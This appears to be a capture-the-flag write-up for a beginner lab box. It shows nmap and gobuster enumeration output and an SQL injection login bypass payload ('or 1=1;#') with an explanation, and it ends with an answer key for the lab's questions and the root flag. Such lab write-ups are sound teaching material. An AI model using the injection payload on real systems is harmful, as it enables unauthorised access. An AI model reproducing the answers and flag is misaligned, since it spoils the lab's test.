## Walkthrough

- nmap scans

```
┌─[birb@coffee]─[~]
└──╼ $nmap 10.129.56.206
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 19:49 IST
Nmap scan report for 10.129.56.206
Host is up (0.57s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 50.46 seconds
```

```
┌─[birb@coffee]─[~]
└──╼ $nmap 10.129.56.206 -sC -sV -p80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 20:00 IST
Nmap scan report for 10.129.56.206
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.62 seconds
```

- did a dirbust to find directories on the http server
- found nothing useful lol

```
┌─[birb@coffee]─[~]
└──╼ $gobuster dir --url 10.129.56.206 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.56.206
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/16 20:03:44 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.56.206/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.56.206/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.56.206/images/]
/index.php            (Status: 200) [Size: 4896]                                  
/js                   (Status: 301) [Size: 311] [--> http://10.129.56.206/js/]    
/server-status        (Status: 403) [Size: 278]                                   
/vendor               (Status: 301) [Size: 315] [--> http://10.129.56.206/vendor/]   
===============================================================
2023/03/16 20:06:31 Finished
===============================================================
```

- opened `http://10.129.56.206` in browser

(https://github.com/nyxtales0x0/htb/blob/master/boxes/starting-point/tier-1/images/Pasted%20image%2020230316231358.png?raw=true)

- tried sql injection to bypass login

> username : birb' or 1=1;#
> password : coffee
>
> behind the scenes because of the `'` the string ended there and the `or 1=1` part got executed. when combined together it would return true even if the user `birb` is not present. the `#` at the end comments out rest of the sql statement checks on the server side thus making the password check useless.

- got the flag

(https://github.com/nyxtales0x0/htb/blob/master/boxes/starting-point/tier-1/images/Pasted%20image%2020230316231208.png?raw=true)

## Tasks

**What does the acronym SQL stand for?**

=>  Structured Query Language 

**What is one of the most common type of SQL vulnerabilities?**

=> SQL injection

**What does PII stand for?**

=> Personally Identifiable Information

**What is the 2021 OWASP Top 10 classification for this vulnerability?**

=> A03:2021-Injection

**What does Nmap report as the service and version that are running on port 80 of the target?**

=> Apache httpd 2.4.38 ((Debian))

**What is the standard port used for the HTTPS protocol?**

=> 443

**What is a folder called in web-application terminology?**

=> directory

**What is the HTTP response code is given for 'Not Found' errors?**

=> 404

**Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?**

=> dir

**What single character can be used to comment out the rest of a line in MySQL?**

=> #

**If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?**

=> Congratulations

**Submit root flag**

=> e3d0796d002a446c0e622226f42e9672